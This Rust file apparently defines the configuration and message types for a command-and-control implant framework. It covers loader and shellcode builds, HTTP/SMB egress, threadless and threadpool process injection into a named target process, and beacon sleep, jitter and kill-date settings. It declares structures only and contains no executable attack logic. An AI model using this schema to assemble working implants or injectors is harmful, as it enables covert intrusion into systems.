use std::collections::HashMap;
use clap::builder::Str;
use serde::{Deserialize, Serialize};

#[derive(Debug)]
pub enum BuildType {
    Loader,
    Shellcode,
}

#[derive(Debug)]
pub enum MessageType {
    TypeCheckin,
    TypeTasking,
    TypeResponse,
    TypeSegement,
}

#[derive(Debug)]
pub enum CommandType {
    CommandDir,
    CommandMods,
    CommandShutdown,
    CommandUpdatePeer,
    CommandNoJob,
}

#[derive(Serialize, Deserialize, Debug)]
#[serde(rename_all = "lowercase")]
pub enum NetworkType {
    Http,
    Smb,
}

#[derive(Serialize, Deserialize, Debug)]
#[serde(untagged)]
pub enum NetworkOptions {
    Http(Http),
    Smb(Smb),
}

#[derive(Serialize, Deserialize, Debug)]
pub struct Network {
    pub r#type:     NetworkType,
    pub options:    NetworkOptions,
}

#[derive(Serialize, Deserialize, Debug)]
pub struct Smb {
    pub(crate) egress_peer: String,
    pub(crate) egress_pipe: Option<String>,
}

#[derive(Serialize, Deserialize, Debug, Default)]
pub struct Http {
    pub(crate) address:    String,
    pub(crate) port:       u16,
    pub(crate) endpoints:  Vec<String>,
    pub(crate) domain:     Option<String>,
    pub(crate) useragent:  Option<String>,
    pub(crate) headers:    Option<Vec<String>>,
    pub(crate) proxy:      Option<Proxy>,
}

#[derive(Serialize, Deserialize, Debug)]
#[serde(rename_all = "lowercase")]
pub enum InjectionType {
    Threadless,
    Threadpool,
}

#[derive(Serialize, Deserialize, Debug)]
#[serde(untagged)]
pub enum InjectionOptions {
    Threadless(Threadless),
    Threadpool(Threadpool),
}

#[derive(Serialize, Deserialize, Debug)]
pub struct Injection {
    pub r#type: InjectionType,
    pub options: InjectionOptions,
}

#[derive(Serialize, Deserialize, Debug)]
pub struct Threadless {
    pub(crate) target_process:     String,
    pub(crate) target_module:      String,
    pub(crate) target_function:    String,
    pub(crate) loader_assembly:    String,
    pub(crate) execute_object:     String,
}

#[derive(Serialize, Deserialize, Debug)]
pub struct Threadpool{
}

#[derive(Debug)]
pub struct Message {
    pub(crate) msg_type:    String,
    pub(crate) msg:         String,
}

#[derive(Serialize, Deserialize, Debug, Default)]
pub struct Config {
    pub(crate) debug:           bool,
    pub(crate) encrypt:         bool,
    pub(crate) architecture:    String,
    pub(crate) hostname:        String,
    pub(crate) working_hours:   Option<String>,
    pub(crate) killdate:        Option<String>,
    pub(crate) config_size:     u32, // says "optional" but will be checked for in the config
    pub(crate) sleeptime:       u32,
    pub(crate) jitter:          u16,
}

#[derive(Serialize, Deserialize, Debug, Default)]
pub struct Builder {
    pub(crate) output_name:            String,
    pub(crate) root_directory:         String,
    pub(crate) linker_script:          Option<String>,
    pub(crate) loaded_modules:         Option<Vec<String>>,
    pub(crate) dependencies:           Option<Vec<String>>,
    pub(crate) include_directories:    Option<Vec<String>>,
}

#[derive(Serialize, Deserialize, Debug)]
pub struct Loader {
    pub(crate) root_directory: String,
    pub(crate) rsrc_script:    String,
    pub(crate) injection:      Injection,
    pub(crate) sources:        Vec<String>,
    pub(crate) linker_script:  Option<String>,
    pub(crate) dependencies:   Option<Vec<String>>,
}

#[derive(Serialize, Deserialize, Debug)]
pub struct Proxy {
    pub(crate) address:    String,
    pub(crate) proto:      String,
    pub(crate) port:       u16,
    pub(crate) username:   Option<String>,
    pub(crate) password:   Option<String>,
}

#[derive(Serialize, Deserialize, Debug)]
pub struct JsonData {
    pub(crate) config:  Config,
    pub(crate) builder: Builder,
    pub(crate) network: Option<Network>, // is option but checked in the config
    pub(crate) loader:  Option<Loader>,
}

#[derive(Debug)]
pub struct MessageParser {
    pub(crate) endian:     u8,
    pub(crate) peer_id:    u32,
    pub(crate) task_id:    u32,
    pub(crate) msg_type:   u32,
    pub(crate) msg_length: u32,
    pub(crate) msg_buffer: Vec<u8>,
}

#[derive(Debug, Default)]
pub struct Compiler {
    pub(crate) file_extension:  String,
    pub(crate) build_directory: String,
    pub(crate) compiler_flags:  String,
    pub(crate) components:      Vec<String>,
    pub(crate) definitions:     HashMap<String, Vec<u8>>,
    pub(crate) command:         String,
}

#[derive(Debug, Default, Clone)]
pub struct UserSession {
    pub(crate) username: String,
    pub(crate) is_admin: bool,
}

